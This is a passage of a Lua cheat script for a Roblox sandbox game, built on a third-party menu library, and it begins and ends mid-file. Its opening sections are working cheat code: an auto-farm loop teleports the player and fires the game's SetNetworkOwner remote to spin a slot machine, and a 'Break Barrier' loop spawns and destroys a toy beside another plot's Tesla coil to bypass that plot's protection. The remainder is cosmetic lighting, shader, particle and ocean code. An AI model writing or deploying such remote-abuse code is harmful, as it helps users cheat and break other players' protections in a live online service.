        _G.PlayerToTeleportDirection = Value
    end,
})

local SlotsFolder = workspace:WaitForChild('Slots')
local SlotsScreen = SlotsFolder:WaitForChild('Slots')
local SlotGui = SlotsScreen:WaitForChild('Screen'):WaitForChild('SlotGui')
local TimeTextObj = SlotGui:WaitForChild('TimeLeftFrame'):WaitForChild('TimeText')
local slotHandle = workspace.Slots.Slots.SlotHandle.Handle
local targetTime = '0:00'
local farmingActive = false
local slotTeleportPosition = Vector3.new(-224.941177, 91.364975, 425.75116)
local savedCFrame = nil
local FarmGroup = Tabs.TpTab:AddLeftGroupbox('Farm Coins', 'boxes')
local timeLabel = FarmGroup:AddLabel('<b>Time:</b> ' .. TimeTextObj.Text)

task.spawn(function()
    while task.wait(1) do
        if TimeTextObj and timeLabel then
            pcall(function()
                timeLabel:SetText('Time: ' .. TimeTextObj.Text)
            end)
        end
    end
end)

function farmLoop()
    while farmingActive do
        task.wait(1)

        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild('HumanoidRootPart')

        if not hrp then
            continue
        end

        savedCFrame = hrp.CFrame

        local currentTime = TimeTextObj and TimeTextObj.Text

        if currentTime == targetTime then
            hrp.CFrame = CFrame.new(slotTeleportPosition)

            task.wait(1)
            pcall(function()
                ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(slotHandle, CFrame.new(slotTeleportPosition))
            end)
            task.wait(1)

            if hrp and hrp.Parent then
                hrp.CFrame = savedCFrame
            end
        end
    end
end

FarmGroup:AddCheckbox('AutoFarmToggle', {
    Text = 'Auto Spin Slots',
    Tooltip = 'Automatically spins a slot for you',
    Default = false,
    Callback = function(state)
        farmingActive = state

        if state then
            task.spawn(farmLoop)
        end
    end,
})
LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild('HumanoidRootPart')

    if farmingActive then
        task.spawn(farmLoop)
    end
end)

local BarrierBox = Tabs.TpTab:AddLeftGroupbox('Barrier', 'wind')

LPlr = Players.LocalPlayer
MenuToys = ReplicatedStorage:WaitForChild('MenuToys')
RunService = game:GetService('RunService')
rs = game:GetService('ReplicatedStorage')
plr = game:GetService('Players').LocalPlayer
inv = workspace:WaitForChild(plr.Name .. 'SpawnedInToys')
BarrierEnabled = false
Running = false

BarrierBox:AddCheckbox('BarrierBreakerToggle', {
    Text = 'Break Barrier',
    Default = false,
})
Toggles.BarrierBreakerToggle:OnChanged(function(state)
    BarrierEnabled = state

    if state then
        startBarrierLoop()
    else
        Running = false
    end
end)

function PlotBarrierDelete()
    if Running then
        return
    end

    Running = true

    local char = plr.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    if not hrp then
        Running = false

        return
    end

    local plots = workspace:FindFirstChild('Plots')
    local plot5 = plots and plots:FindFirstChild('Plot5')
    local metal = plot5 and plot5:FindFirstChild('TeslaCoil') and plot5.TeslaCoil:FindFirstChild('Metal')

    if not metal then
        Running = false

        return
    end

    local targetCF = metal.CFrame
    local originalCF = hrp.CFrame

    rs.MenuToys.SpawnToyRemoteFunction:InvokeServer('FoodBread', originalCF, Vector3.zero)

    local foodBread
    local t0 = os.clock()

    repeat
        foodBread = inv:FindFirstChild('FoodBread')

        RunService.Heartbeat:Wait()
    until foodBread or os.clock() - t0 > 0.1

    if not foodBread then
        Running = false

        return
    end
    if foodBread:FindFirstChild('HoldPart') then
        foodBread.HoldPart.HoldItemRemoteFunction:InvokeServer(foodBread, char)
    end

    local steps = 3

    for i = 1, steps do
        hrp.CFrame = originalCF:Lerp(targetCF, i / steps)

        RunService.Heartbeat:Wait()
    end

    rs.MenuToys.DestroyToy:FireServer(foodBread)

    for i = 1, steps do
        hrp.CFrame = targetCF:Lerp(originalCF, i / steps)

        RunService.Heartbeat:Wait()
    end

    Running = false
end
function startBarrierLoop()
    task.spawn(function()
        while BarrierEnabled do
            PlotBarrierDelete()
            RunService.Heartbeat:Wait()
        end
    end)
end

LP = Players.LocalPlayer
TAU = math.pi * 2

function tween(inst, props, t, style, dir)
    TweenS:Create(inst, TweenInfo.new(t or 0.5, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props):Play()
end
function safe(fn, ...)
    local ok, err = pcall(fn, ...)

    if not ok then
        warn('[VisualFX] ' .. tostring(err))
    end
end

OrigLighting = {
    Ambient = Lighting.Ambient,
    OutdoorAmbient = Lighting.OutdoorAmbient,
    Brightness = Lighting.Brightness,
    ClockTime = Lighting.ClockTime,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart,
    FogColor = Lighting.FogColor,
    GlobalShadows = Lighting.GlobalShadows,
    ColorShift_Bottom = Lighting.ColorShift_Bottom,
    ColorShift_Top = Lighting.ColorShift_Top,
    ExposureCompensation = Lighting.ExposureCompensation,
}
LightingPresets = {
    Default = function()
        tween(Lighting, {
            Ambient = OrigLighting.Ambient,
            OutdoorAmbient = OrigLighting.OutdoorAmbient,
            Brightness = OrigLighting.Brightness,
            ClockTime = OrigLighting.ClockTime,
            FogEnd = OrigLighting.FogEnd,
            FogColor = OrigLighting.FogColor,
        }, 0.8)

        Lighting.ColorShift_Top = OrigLighting.ColorShift_Top
        Lighting.ColorShift_Bottom = OrigLighting.ColorShift_Bottom
    end,
    Midnight = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(5, 5, 15),
            OutdoorAmbient = Color3.fromRGB(8, 8, 25),
            Brightness = 0.5,
            ClockTime = 0,
            FogEnd = 400,
            FogColor = Color3.fromRGB(5, 5, 20),
        }, 0.8)
    end,
    GoldenHour = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(90, 60, 30),
            OutdoorAmbient = Color3.fromRGB(200, 130, 60),
            Brightness = 3.5,
            ClockTime = 18.2,
            FogEnd = 2000,
            FogColor = Color3.fromRGB(255, 180, 100),
        }, 0.8)
    end,
    Overcast = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(100, 100, 110),
            OutdoorAmbient = Color3.fromRGB(140, 145, 155),
            Brightness = 1,
            ClockTime = 12,
            FogEnd = 600,
            FogColor = Color3.fromRGB(180, 185, 195),
        }, 0.8)
    end,
    Neon = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(10, 0, 25),
            OutdoorAmbient = Color3.fromRGB(20, 0, 50),
            Brightness = 0.3,
            ClockTime = 0,
            FogEnd = 300,
            FogColor = Color3.fromRGB(20, 0, 60),
        }, 0.8)

        Lighting.ColorShift_Top = Color3.fromRGB(80, 0, 180)
        Lighting.ColorShift_Bottom = Color3.fromRGB(0, 180, 120)
    end,
    Sunset = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(120, 70, 40),
            OutdoorAmbient = Color3.fromRGB(240, 100, 40),
            Brightness = 2.8,
            ClockTime = 19.5,
            FogEnd = 1500,
            FogColor = Color3.fromRGB(255, 140, 80),
        }, 0.8)
    end,
    Arctic = function()
        tween(Lighting, {
            Ambient = Color3.fromRGB(140, 160, 180),
            OutdoorAmbient = Color3.fromRGB(180, 200, 220),
            Brightness = 1.8,
            ClockTime = 10,
            FogEnd = 800,
            FogColor = Color3.fromRGB(200, 215, 235),
        }, 0.8)
    end,
}

function applyLightingPreset(name)
    local fn = LightingPresets[name]

    if fn then
        safe(fn)
    end
end
function resetLighting()
    for k, v in pairs(OrigLighting)do
        safe(function()
            Lighting[k] = v
        end)
    end
end

FX = {}

function getFX(class, name)
    local existing = Lighting:FindFirstChild(name or class)

    if existing then
        return existing
    end

    local inst = Instance.new(class)

    inst.Name = name or class
    inst.Parent = Lighting

    return inst
end
function initFX()
    FX.Bloom = getFX('BloomEffect', 'PH_Bloom')
    FX.CC = getFX('ColorCorrectionEffect', 'PH_CC')
    FX.SunRays = getFX('SunRaysEffect', 'PH_SunRays')
    FX.Blur = getFX('BlurEffect', 'PH_Blur')
    FX.DOF = getFX('DepthOfFieldEffect', 'PH_DOF')
    FX.Bloom.Enabled = false
    FX.CC.Enabled = false
    FX.SunRays.Enabled = false
    FX.Blur.Enabled = false
    FX.DOF.Enabled = false
end

safe(initFX)

function setBloom(on, intensity, size, threshold)
    FX.Bloom.Enabled = on
    FX.Bloom.Intensity = intensity or 0.5
    FX.Bloom.Size = size or 24
    FX.Bloom.Threshold = threshold or 0.95
end
function setSunRays(on, intensity, spread)
    FX.SunRays.Enabled = on
    FX.SunRays.Intensity = intensity or 0.1
    FX.SunRays.Spread = spread or 0.25
end
function setBlur(on, size)
    FX.Blur.Enabled = on
    FX.Blur.Size = size or 10
end
function setCC(on, brightness, contrast, sat, tint)
    FX.CC.Enabled = on
    FX.CC.Brightness = brightness or 0
    FX.CC.Contrast = contrast or 0
    FX.CC.Saturation = sat or 0
    FX.CC.TintColor = tint or Color3.new(1, 1, 1)
end
function setDOF(on, farI, focusDist, nearI, inFocus)
    FX.DOF.Enabled = on
    FX.DOF.FarIntensity = farI or 0.25
    FX.DOF.FocusDistance = focusDist or 50
    FX.DOF.NearIntensity = nearI or 0
    FX.DOF.InFocusRadius = inFocus or 25
end

local ShaderPresets = {
    Soft = {
        Bloom = 0.2,
        BloomSize = 18,
        CC_C = 0.05,
        CC_S = -2E-2,
        CC_B = 0.01,
        Rays = 0.05,
        Blur = 1,
    },
    Bright = {
        Bloom = 0.45,
        BloomSize = 30,
        CC_C = 0.12,
        CC_S = 0.05,
        CC_B = 0.08,
        Rays = 0.12,
        Blur = 0,
    },
    Dark = {
        Bloom = 0.15,
        BloomSize = 12,
        CC_C = 0.2,
        CC_S = -0.15,
        CC_B = -8E-2,
        Rays = 0.02,
        Blur = 2,
    },
    Cinematic = {
        Bloom = 0.35,
        BloomSize = 24,
        CC_C = 0.18,
        CC_S = -0.1,
        CC_B = 0,
        Rays = 0.07,
        Blur = 1,
    },
    Vibrant = {
        Bloom = 0.6,
        BloomSize = 32,
        CC_C = 0.1,
        CC_S = 0.3,
        CC_B = 0.05,
        Rays = 0.15,
        Blur = 0,
    },
    Horror = {
        Bloom = 0.1,
        BloomSize = 8,
        CC_C = 0.3,
        CC_S = -0.5,
        CC_B = -0.15,
        Rays = 0,
        Blur = 3,
    },
}

function applyShaderPreset(name)
    local p = ShaderPresets[name]

    if not p then
        return
    end

    FX.Bloom.Enabled = true
    FX.Bloom.Intensity = p.Bloom
    FX.Bloom.Size = p.BloomSize
    FX.CC.Enabled = true
    FX.CC.Contrast = p.CC_C
    FX.CC.Saturation = p.CC_S
    FX.CC.Brightness = p.CC_B
    FX.SunRays.Enabled = true
    FX.SunRays.Intensity = p.Rays
    FX.Blur.Enabled = (p.Blur > 0)
    FX.Blur.Size = p.Blur
end
function getOceanParts()
    local ok, model = pcall(function()
        return workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel
    end)

    if not ok or not model then
        return {}
    end

    local parts = {}
    local children = model:GetChildren()
    local namedOcean = model:FindFirstChild('Ocean')

    if namedOcean and namedOcean:IsA('BasePart') then
        table.insert(parts, namedOcean)
    end

    for _, child in ipairs(children)do
        if child:IsA('BasePart') and child ~= namedOcean then
            table.insert(parts, child)
        end
    end

    return parts
end

local _cachedOceanParts = nil

function oceanParts()
    if not _cachedOceanParts then
        _cachedOceanParts = getOceanParts()
    end

    return _cachedOceanParts
end
function setOceanColor(color)
    for _, p in ipairs(oceanParts())do
        safe(function()
            p.Color = color
        end)
    end
end
function setOceanMaterial(mat)
    for _, p in ipairs(oceanParts())do
        safe(function()
            p.Material = mat
        end)
    end
end

local WaterTextures = {
    Default = nil,
    Lava = 'rbxassetid://6394290421',
    Obsidian = 'rbxassetid://9052553202',
    Rock = 'rbxassetid://1394910385',
    RealisticWater = 'rbxassetid://7390245700',
    Ice = 'rbxassetid://284182421',
    Sand = 'rbxassetid://1507949023',
    Marble = 'rbxassetid://67959025',
    Acid = 'rbxassetid://7531889218',
}

function clearOceanTextures()
    for _, p in ipairs(oceanParts())do
        safe(function()
            for _, child in ipairs(p:GetChildren())do
                if child:IsA('Texture') and child.Name == 'PH_WaterTex' then
                    child:Destroy()
                end
            end
        end)
    end
end
function setOceanTexture(name)
    clearOceanTextures()

    local id = WaterTextures[name]

    if not id then
        return
    end

    for _, p in ipairs(oceanParts())do
        safe(function()
            local faces = {
                Enum.NormalId.Top,
                Enum.NormalId.Front,
                Enum.NormalId.Back,
                Enum.NormalId.Left,
                Enum.NormalId.Right,
            }

            for _, face in ipairs(faces)do
                local tex = Instance.new('Texture')

                tex.Name = 'PH_WaterTex'
                tex.Texture = id
                tex.Face = face
                tex.StudsPerTileU = 10
                tex.StudsPerTileV = 10
                tex.Parent = p
            end
        end)
    end
end

particlePart = nil
activeEmitter = nil
particleHeartbeat = nil
ParticleSettings = {
    Rate = 20,
    Lifetime = 5,
    Speed = 3,
    Size = 0.25,
    Width = 250,
    Height = 35,
    FollowPlayer = true,
}

local ParticlePresets = {
    Fireflies = {
        Color = ColorSequence.new(Color3.fromRGB(180, 255, 100)),
        LightEmission = 1,
        LightInfluence = 0,
        Rate = 8,
        Lifetime = NumberRange.new(4, 8),
        Speed = NumberRange.new(0.5, 2),
        SpreadAngle = Vector2.new(360, 360),
        Acceleration = Vector3.new(0, 1, 0),
        Rotation = NumberRange.new(0, 360),
        RotSpeed = NumberRange.new(-45, 45),
        Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.3, 0.2),
            NumberSequenceKeypoint.new(1, 0),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 1),
            NumberSequenceKeypoint.new(0.2, 0),
            NumberSequenceKeypoint.new(0.8, 0),
            NumberSequenceKeypoint.new(1, 1),
        }),
    },
    Embers = {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 200, 50)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 60, 0)),
        }),
        LightEmission = 0.8,
        LightInfluence = 0,
        Rate = 20,
        Lifetime = NumberRange.new(2, 5),
        Speed = NumberRange.new(3, 8),
        SpreadAngle = Vector2.new(25, 25),
        Acceleration = Vector3.new(0, 6, 0),
        Rotation = NumberRange.new(0, 360),
        RotSpeed = NumberRange.new(-180, 180),
        Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.2),
            NumberSequenceKeypoint.new(1, 0),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(1, 1),
        }),
    },
    Snow = {
        Color = ColorSequence.new(Color3.fromRGB(230, 240, 255)),
        LightEmission = 0,
        LightInfluence = 1,
        Rate = 40,
        Lifetime = NumberRange.new(5, 10),
        Speed = NumberRange.new(2, 4),
        SpreadAngle = Vector2.new(180, 10),
        Acceleration = Vector3.new(0, -1, 0),
        Rotation = NumberRange.new(0, 360),
        RotSpeed = NumberRange.new(-20, 20),
        Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.2),
            NumberSequenceKeypoint.new(1, 0.15),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.1),
            NumberSequenceKeypoint.new(1, 0.5),
        }),
    },
    Ash = {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 100)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 50)),
        }),
        LightEmission = 0,
        LightInfluence = 0.5,
        Rate = 30,
        Lifetime = NumberRange.new(6, 12),
        Speed = NumberRange.new(1, 3),
        SpreadAngle = Vector2.new(360, 360),
        Acceleration = Vector3.new(2, 0.2, 0),
        Rotation = NumberRange.new(0, 360),
        RotSpeed = NumberRange.new(-30, 30),
        Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.1),
            NumberSequenceKeypoint.new(0.5, 0.3),
            NumberSequenceKeypoint.new(1, 0),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.3),
            NumberSequenceKeypoint.new(1, 1),
        }),
    },
    Rain = {
        Color = ColorSequence.new(Color3.fromRGB(180, 200, 230)),
        LightEmission = 0,
        LightInfluence = 1,
        Rate = 120,
        Lifetime = NumberRange.new(1, 2),
        Speed = NumberRange.new(20, 35),
        SpreadAngle = Vector2.new(5, 5),
        Acceleration = Vector3.new(0, -25, 0),
        Rotation = NumberRange.new(80, 100),
        RotSpeed = NumberRange.new(0, 0),
        Size = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.05),
            NumberSequenceKeypoint.new(1, 0.05),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.5),
            NumberSequenceKeypoint.new(1, 0.8),
        }),
    },
}

function clearParticles()
    if particleHeartbeat then
        particleHeartbeat:Disconnect()

        particleHeartbeat = nil
    end
    if activeEmitter then
        activeEmitter:Destroy()

        activeEmitter = nil
    end
    if particlePart then
        particlePart:Destroy()

        particlePart = nil
    end
end
function updateParticleEmitter()
    if not activeEmitter then
        return
    end

    activeEmitter.Rate = ParticleSettings.Rate
    activeEmitter.Lifetime = NumberRange.new(ParticleSettings.Lifetime * 0.7, ParticleSettings.Lifetime)
    activeEmitter.Speed = NumberRange.new(ParticleSettings.Speed * 0.5, ParticleSettings.Speed)
    activeEmitter.Size = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 0),
        NumberSequenceKeypoint.new(0.2, ParticleSettings.Size),
        NumberSequenceKeypoint.new(1, 0),
    })

    if particlePart then
        particlePart.Size = Vector3.new(ParticleSettings.Width, 1, ParticleSettings.Width)
    end
end
function spawnParticles(preset)
    clearParticles()

    local data = ParticlePresets[preset]

    if not data then
        return
    end

    local char = LP.Character
    local hrp = char and char:FindFirstChild('HumanoidRootPart')

    particlePart = Instance.new('Part')
    particlePart.Name = 'PH_WorldParticles'
    particlePart.Anchored = true
    particlePart.CanCollide = false
    particlePart.Transparency = 1
    particlePart.Size = Vector3.new(ParticleSettings.Width, 1, ParticleSettings.Width)
    particlePart.Position = hrp and (hrp.Position - Vector3.new(0, ParticleSettings.Height, 0)) or Vector3.zero
    particlePart.Parent = workspace
    activeEmitter = Instance.new('ParticleEmitter')
    activeEmitter.Enabled = true
    activeEmitter.EmissionDirection = Enum.NormalId.Top
    activeEmitter.LockedToPart = false
    activeEmitter.Parent = particlePart

    for k, v in pairs(data)do
        safe(function()
            activeEmitter[k] = v
        end)
    end

    updateParticleEmitter()

    particleHeartbeat = RunService.Heartbeat:Connect(function()
        if not ParticleSettings.FollowPlayer or not particlePart then
            return
        end

        local c = LP.Character
        local r = c and c:FindFirstChild('HumanoidRootPart')

        if r then
            particlePart.Position = r.Position - Vector3.new(0, ParticleSettings.Height, 0)
        end
    end)
end

GShaders = Tabs.ESP:AddLeftGroupbox('Shaders', 'sparkles')
GEnvironment = Tabs.ESP:AddRightGroupbox('Environment', 'sun')
GPostFX = Tabs.ESP:AddLeftGroupbox('Post FX', 'wand')
GWater = Tabs.ESP:AddRightGroupbox('Ocean', 'droplets')
EnableShaders = GShaders:AddCheckbox('EnableShaders', {
    Text = 'Enable Visual FX',
    Default = false,
})

EnableShaders:OnChanged(function(v)
    if v then
        safe(applyShaderPreset, 'Soft')
    else
        for _, fx in pairs(FX)do
            safe(function()
                fx.Enabled = false
            end)
        end
    end
end)

ShaderPreset = GShaders:AddDropdown('ShaderPreset', {
    Text = 'Shader Preset',
    Values = {
        'Soft',
        'Bright',
        'Dark',
        'Cinematic',
        'Vibrant',
        'Horror',
    },
    Default = 'Soft',
})

ShaderPreset:OnChanged(function(v)
    if Toggles.EnableShaders and Toggles.EnableShaders.Value then
        safe(applyShaderPreset, v)
    end
end)

ShaderBloom = GShaders:AddSlider('ShaderBloom', {
    Text = 'Bloom Intensity',
    Default = 35,
    Min = 0,
    Max = 100,
    Rounding = 0,
})

ShaderBloom:OnChanged(function(v)
    if FX.Bloom then
        FX.Bloom.Enabled = v > 0
        FX.Bloom.Intensity = v / 100
    end
end)

ShaderBloomSize = GShaders:AddSlider('ShaderBloomSize', {
    Text = 'Bloom Size',
    Default = 24,
    Min = 1,
    Max = 56,
    Rounding = 0,
})

ShaderBloomSize:OnChanged(function(v)
    if FX.Bloom then
        FX.Bloom.Size = v
    end
end)

ShaderBlur = GShaders:AddSlider('ShaderBlur', {
    Text = 'Blur',
    Default = 0,
    Min = 0,
    Max = 24,
    Rounding = 0,
})

ShaderBlur:OnChanged(function(v)
    if FX.Blur then
        FX.Blur.Enabled = v > 0
        FX.Blur.Size = v
    end
end)

ShaderContrast = GShaders:AddSlider('ShaderContrast', {
    Text = 'Contrast',
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
})

ShaderContrast:OnChanged(function(v)
    if FX.CC then
        FX.CC.Enabled = true
        FX.CC.Contrast = v / 100
    end
end)

ShaderSaturation = GShaders:AddSlider('ShaderSaturation', {
    Text = 'Saturation',
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
})

ShaderSaturation:OnChanged(function(v)
    if FX.CC then
        FX.CC.Enabled = true
        FX.CC.Saturation = v / 100
    end
end)

ShaderBrightness = GShaders:AddSlider('ShaderBrightness', {
    Text = 'Exposure Adjust',
    Default = 0,
    Min = -100,
    Max = 100,
    Rounding = 0,
})

ShaderBrightness:OnChanged(function(v)
    if FX.CC then
        FX.CC.Enabled = true
        FX.CC.Brightness = v / 100
    end
end)

LightingPreset = GEnvironment:AddDropdown('LightingPreset', {
    Text = 'Lighting Preset',
    Values = {
        'Default',
        'Midnight',
        'GoldenHour',
        'Overcast',
        'Neon',
        'Sunset',
        'Arctic',
    },
    Default = 'Default',
})

LightingPreset:OnChanged(function(v)
    safe(applyLightingPreset, v)
end)

EnvBrightness = GEnvironment:AddSlider('EnvBrightness', {
    Text = 'Brightness',
    Default = math.floor(Lighting.Brightness * 10),
    Min = 0,
    Max = 50,
    Rounding = 0,
})

EnvBrightness:OnChanged(function(v)
    Lighting.Brightness = v / 10
end)

EnvClockTime = GEnvironment:AddSlider('EnvClockTime', {
    Text = 'Time Of Day',
    Default = math.floor(Lighting.ClockTime),
    Min = 0,
    Max = 24,
    Rounding = 0,
})

EnvClockTime:OnChanged(function(v)
    Lighting.ClockTime = v
end)

FogDistance = GEnvironment:AddSlider('EnvFogEnd', {
    Text = 'Fog Distance',
    Default = math.clamp(math.floor(Lighting.FogEnd), 50, 10000),
    Min = 50,
    Max = 10000,
    Rounding = 0,
})

FogDistance:OnChanged(function(v)
    Lighting.FogEnd = v
end)
GEnvironment:AddButton('Reset Lighting', function()
    safe(resetLighting)
end)

FXSunRays = GPostFX:AddCheckbox('FX_SunRays', {
    Text = 'Sun Rays',
    Default = false,
})

FXSunRays:OnChanged(function(v)
    safe(setSunRays, v)
end)

local FXSunRayIntensity = GPostFX:AddSlider('FX_SunRayIntensity', {
    Text = 'Sun Ray Intensity',
    Default = 10,
    Min = 0,
    Max = 100,
    Rounding = 0,
})

FXSunRayIntensity:OnChanged(function(v)
    if FX.SunRays then
        FX.SunRays.Intensity = v / 100
    end
end)

OceanFolder = workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel
_cachedOceanParts = nil

function oceanParts()
    if _cachedOceanParts then
        return _cachedOceanParts
    end

    local parts = {}

    for _, obj in ipairs(OceanFolder:GetDescendants())do
        if obj:IsA('BasePart') then
            table.insert(parts, obj)
        end
    end

    _cachedOceanParts = parts

    return parts
end
function setOceanMaterial(materialName)
    local material = Enum.Material[materialName]

    if not material then
        return
    end

    for _, part in ipairs(oceanParts())do
        part.Material = material
    end
end
function setOceanColor(color)
    for _, part in ipairs(oceanParts())do
        part.Color = color
    end
end

WaterMaterial = GWater:AddDropdown('WaterMaterial', {
    Text = 'Ocean Material',
    Values = {
        'Water',
        'Glass',
        'Neon',
        'SmoothPlastic',
        'Ice',
        'Sand',
        'Rock',
        'Basalt',
        'Slate',
        'Mud',
        'Cobblestone',
    },
    Default = 'Water',
})

Options.WaterMaterial:OnChanged(function()
    setOceanMaterial(Options.WaterMaterial.Value)
end)

OceanToggle = GWater:AddCheckbox('EnableOceanColor', {
    Text = 'Custom Ocean Color',
    Default = true,
})

OceanToggle:AddColorPicker('OceanColorPicker', {
    Default = Color3.fromRGB(0, 170, 255),
    Title = 'Ocean Color',
    Callback = function(Value)
        setOceanColor(Value)
    end,
})
Options.OceanColorPicker:OnChanged(function()
    setOceanColor(Options.OceanColorPicker.Value)

    if Options.OceanColorPicker.Transparency then
        for _, part in ipairs(oceanParts())do
            part.Transparency = Options.OceanColorPicker.Transparency
        end
    end
end)
GWater:AddButton('Refresh Ocean Cache', function()
    _cachedOceanParts = nil
    _cachedOceanParts = oceanParts()

    setOceanMaterial(Options.WaterMaterial.Value)
    setOceanColor(Options.OceanColorPicker.Value)
end)
GWater:AddCheckbox('RealisticWater', {
    Text = 'Realistic Water',
    Default = false,
})
Toggles.RealisticWater:OnChanged(function(state)
    if state then
        local terrain = workspace.Terrain
        local model = workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel

        for _, part in ipairs(model:GetChildren())do
            if part:IsA('Part') then
                local size = part.Size
                local cf = part.CFrame
                local region = Region3.new(cf.Position - size / 2, cf.Position + size / 2):ExpandToGrid(4)

                terrain:FillRegion(region, 4, Enum.Material.Water)
                part:Destroy()
            end
        end
    end
end)

PostFxBox = Tabs.ESP:AddRightGroupbox('Visual Shaders', 'wand-sparkles')
originalLighting = {
    Ambient = Lighting.Ambient,
    OutdoorAmbient = Lighting.OutdoorAmbient,
    GlobalShadows = Lighting.GlobalShadows,
    Brightness = Lighting.Brightness,
}
ShaderState = {
    active = false,
    selected = '',
}

function ApplyShader(shaderType)
    for _, child in pairs(Lighting:GetChildren())do
        if child:IsA('PostEffect') or child:IsA('Sky') or child:IsA('Atmosphere') then
            child:Destroy()
        end
    end

    Lighting.Brightness = 2
    Lighting.ExposureCompensation = 0
    Lighting.ClockTime = 14
    Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
    Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
    Lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 200)
    Lighting.FogColor = Color3.fromRGB(192, 192, 192)
    Lighting.FogEnd = 100000
    Lighting.FogStart = 0
    Lighting.ShadowSoftness = 0
    Lighting.Ambient = Color3.fromRGB(120, 120, 120)

    if shaderType == 'Classic' then
        local sky = Instance.new('Sky', Lighting)

        sky.StarCount = 5000
        sky.SunAngularSize = 5

        local bloom = Instance.new('BloomEffect', Lighting)

        bloom.Intensity = 0.3
        bloom.Size = 10
        bloom.Threshold = 0.8

        local blur = Instance.new('BlurEffect', Lighting)

        blur.Size = 5

        local cc = Instance.new('ColorCorrectionEffect', Lighting)

        cc.Brightness = 0
        cc.Contrast = 0.1
        cc.Saturation = 0.25
        cc.TintColor = Color3.fromRGB(255, 255, 255)

        local sr = Instance.new('SunRaysEffect', Lighting)

        sr.Intensity = 0.1
        sr.Spread = 0.8
        Lighting.Brightness = 2.25
        Lighting.ExposureCompensation = 0.1
        Lighting.ClockTime = 17.55
    elseif shaderType == 'Twilight' then
        local bloom = Instance.new('BloomEffect', Lighting)

        bloom.Intensity = 0.1
        bloom.Threshold = 0
        bloom.Size = 100

        local sky = Instance.new('Sky', Lighting)

        sky.SkyboxUp = 'rbxassetid://323493360'
        sky.SkyboxLf = 'rbxassetid://323494252'
        sky.SkyboxBk = 'rbxassetid://323494035'
        sky.SkyboxFt = 'rbxassetid://323494130'
        sky.SkyboxDn = 'rbxassetid://323494368'
        sky.SunAngularSize = 14
        sky.SkyboxRt = 'rbxassetid://323494067'

        local cc = Instance.new('ColorCorrectionEffect', Lighting)

        cc.Saturation = 0.05
        cc.TintColor = Color3.fromRGB(255, 224, 219)

        local sr = Instance.new('SunRaysEffect', Lighting)

        sr.Intensity = 0.05
        Lighting.Brightness = 3.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
        Lighting.ColorShift_Top = Color3.fromRGB(240, 127, 14)
        Lighting.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
        Lighting.ClockTime = 6.7
        Lighting.FogColor = Color3.fromRGB(94, 76, 106)
        Lighting.FogEnd = 1000
        Lighting.ExposureCompensation = 0.24
        Lighting.Ambient = Color3.fromRGB(59, 33, 27)
    elseif shaderType == 'Luminous' then
        local bloom = Instance.new('BloomEffect', Lighting)

        bloom.Intensity = 0.1
        bloom.Threshold = 0
        bloom.Size = 100

        local sky = Instance.new('Sky', Lighting)

        sky.SkyboxUp = 'rbxassetid://323493360'
        sky.SkyboxLf = 'rbxassetid://323494252'
        sky.SkyboxBk = 'rbxassetid://323494035'
        sky.SkyboxFt = 'rbxassetid://323494130'
        sky.SkyboxDn = 'rbxassetid://323494368'
        sky.SunAngularSize = 14
        sky.SkyboxRt = 'rbxassetid://323494067'
        Lighting.Brightness = 2
        Lighting.ColorShift_Bottom = Color3.fromRGB(250, 250, 250)
        Lighting.ColorShift_Top = Color3.fromRGB(250, 250, 250)
        Lighting.OutdoorAmbient = Color3.fromRGB(150, 150, 150)
        Lighting.ClockTime = 10
        Lighting.FogColor = Color3.fromRGB(20, 20, 20)
        Lighting.FogEnd = 10000
        Lighting.ExposureCompensation = 0.5
        Lighting.Ambient = Color3.fromRGB(50, 50, 50)
    elseif shaderType == 'Sandstorm' then
        local bloom = Instance.new('BloomEffect', Lighting)

        bloom.Intensity = 0.1
        bloom.Threshold = 0
        bloom.Size = 100

        local sky = Instance.new('Sky', Lighting)

        sky.SkyboxUp = 'rbxassetid://323493360'
        sky.SkyboxLf = 'rbxassetid://323494252'
        sky.SkyboxBk = 'rbxassetid://323494035'
        sky.SkyboxFt = 'rbxassetid://323494130'
        sky.SkyboxDn = 'rbxassetid://323494368'
        sky.SunAngularSize = 14
        sky.SkyboxRt = 'rbxassetid://323494067'
        Lighting.Brightness = 2.5
        Lighting.ColorShift_Bottom = Color3.fromRGB(240, 120, 20)
